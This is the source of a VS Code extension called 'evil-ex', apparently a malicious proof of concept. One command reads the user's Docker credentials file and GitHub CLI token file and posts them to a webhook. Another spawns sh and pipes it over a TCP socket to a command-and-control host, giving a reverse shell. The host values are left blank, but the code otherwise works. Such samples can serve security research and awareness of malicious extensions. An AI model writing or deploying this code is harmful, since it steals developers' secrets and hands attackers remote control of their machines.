const axios = require('axios');
const childProcess = require('child_process');
const fs = require('fs');
const net = require("net");
const os = require("os");
const path = require('path');
const vscode = require('vscode');


/**
 * @param {vscode.ExtensionContext} context
 */
 
function activate(context) {
	
	let dataExfil = vscode.commands.registerCommand('evil-ex.007', () => {

		async function dataExfil() {

			const webhookUrl = '';
			
			try {
				const dockerConfigPath = path.join(os.homedir(), '.docker', 'config.json');
				const ghHostsPath = path.join(os.homedir(), '.config', 'gh', 'hosts.yml');
				const [dockerConfigData, ghHostsData] = await Promise.all([
					fs.promises.readFile(dockerConfigPath, { encoding: 'utf8' }),
					fs.promises.readFile(ghHostsPath, { encoding: 'utf8' })
				]);

				const secrets = { dockerConfig: dockerConfigData, ghHosts: ghHostsData };
				const response = await axios.post(webhookUrl, secrets);
				vscode.window.showInformationMessage(`Secrets exfiltrated! Status code: ${response.status}`);
			} 
			catch (error) {
				vscode.window.showErrorMessage(`Error: ${error}`);
			}
		}

		dataExfil();

		vscode.window.showInformationMessage('Evil-Ex is now live. May the Force be with you!');
        vscode.window.showInformationMessage('Looking? Found someone you have, I would say, hmmm?');
    });

	context.subscriptions.push(dataExfil);


	let revShell = vscode.commands.registerCommand('evil-ex.1337', () => {

		function revShell() {

			let c2_IP = '';
			let c2_Port = 1337;
		  
			const shell = {
			  'linux':'sh'
			};
		  
			const command = shell[os.platform()];
			if (!command) {
			  vscode.window.showErrorMessage('OS not tested (yet)');
			  return;
			}
		  
			try {

			  const proc = childProcess.exec(command);

			  const sock = new net.Socket();
		  
			  sock.connect({ port: c2_Port, host: c2_IP }, () => {
				vscode.window.showInformationMessage(`Connected to C2 @ IP: ${c2_IP} & Port: ${c2_Port}`);
				sock.pipe(proc.stdin);
				proc.stdout.pipe(sock);
				proc.stderr.pipe(sock);
			  });
		  
			  sock.on('error', (err) => {
				vscode.window.showErrorMessage(`Connection error: ${err}`);
			  });
		  
			  sock.on('close', () => {
				vscode.window.showErrorMessage('Connection closed');
			  });
		  
			} 
			catch (err) {
			  vscode.window.showErrorMessage(`Error: ${err}`);
			}
		  }
		  
		  revShell();

		vscode.window.showInformationMessage('Evil-Ex is now live. May the Force be with you!');
		vscode.window.showInformationMessage('Powerful you have become, the dark side I sense in you!');
		});

	context.subscriptions.push(revShell);

}


function deactivate() {}

module.exports = {
	activate,
	deactivate
}
